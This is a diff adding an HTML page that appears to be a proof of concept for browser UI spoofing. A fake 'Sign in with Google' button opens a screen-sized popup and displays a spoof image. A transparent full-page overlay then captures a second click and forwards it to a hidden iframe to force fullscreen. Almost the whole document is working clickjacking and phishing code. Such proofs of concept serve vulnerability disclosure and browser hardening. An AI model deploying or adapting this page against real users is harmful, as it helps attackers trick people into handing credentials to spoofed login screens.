@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #fullscreen-iframe {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      border: none;
+      pointer-events: none; /* Initially non-interactive */
+      z-index: -1; /* Behind everything */
+    }
+    
+    #spoof-ui {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
+    }
+    
+    #iframe-overlay {
+      display: none; /* Show after popup opens */
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 999;
+      background: transparent;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="step1_openPopup()">
+    Sign in with Google
+  </button>
+  
+  <iframe id="fullscreen-iframe" src="fullscreen-iframe.html"></iframe>
+  <div id="iframe-overlay" onclick="step2_triggerFullscreen()"></div>
+  <img id="spoof-ui" src="spoof.png">
+  
+  <script>
+    let popup;
+    
+    function step1_openPopup() {
+      // USER GESTURE #1: Open popup
+      popup = window.open("opener.html", "spoof", 
+        "width=" + screen.width + ",height=" + screen.height);
+      
+      // Show spoof UI
+      document.getElementById("spoof-ui").style.display = "block";
+      
+      // Enable transparent overlay for next click
+      document.getElementById("iframe-overlay").style.display = "block";
+      
+      // Prepare iframe (but can't fullscreen yet - no gesture in iframe)
+      document.getElementById("fullscreen-iframe")
+        .contentWindow.postMessage("prepare", "*");
+    }
+    
+    function step2_triggerFullscreen() {
+      // USER GESTURE #2: Forward to iframe
+      let iframe = document.getElementById("fullscreen-iframe");
+      
+      // Make iframe interactive
+      iframe.style.pointerEvents = "auto";
+      iframe.style.zIndex = "1000";
+      
+      // Simulate click on iframe to create gesture in iframe context
+      let clickEvent = new MouseEvent("click", {
+        bubbles: true,
+        cancelable: true
+      });
+      iframe.contentWindow.dispatchEvent(clickEvent);
+      
+      // Or send message
+      iframe.contentWindow.postMessage("fullscreen", "*");
+      
+      // Hide overlay
+      document.getElementById("iframe-overlay").style.display = "none";
+    }
+  </script>
+</body>
+</html>
